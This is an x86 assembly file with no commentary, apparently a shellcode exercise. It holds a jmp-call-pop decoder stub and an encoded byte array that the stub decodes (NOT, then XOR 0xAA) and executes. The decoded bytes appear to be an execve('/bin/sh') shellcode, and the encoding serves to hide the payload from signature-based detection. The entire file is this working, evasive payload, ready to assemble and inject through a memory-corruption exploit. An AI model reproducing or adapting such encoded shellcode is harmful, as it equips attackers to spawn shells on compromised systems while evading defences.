global _start


section .text

_start:

	jmp short call_decoder




decoder_start:

	pop esi


decoder:

	cmp byte [esi], 0xaa
	jz shellcode
	not byte [esi]
	xor byte [esi], 0xAA
	mov al, 0x50
	sub byte al, [esi]
	inc esi
	jmp short decoder		
	

call_decoder:

	call decoder_start
	shellcode: db 0x64,0x95,0x05,0x3d,0x7a,0x7a,0x26,0x3d,0x3d,0x7a,0x37,0x3c,0x3b,0xdc,0xb6,0x05,0xdc,0xb7,0x06,0xdc,0xb4,0xe5,0x5e,0x98,0xd5,0xaa
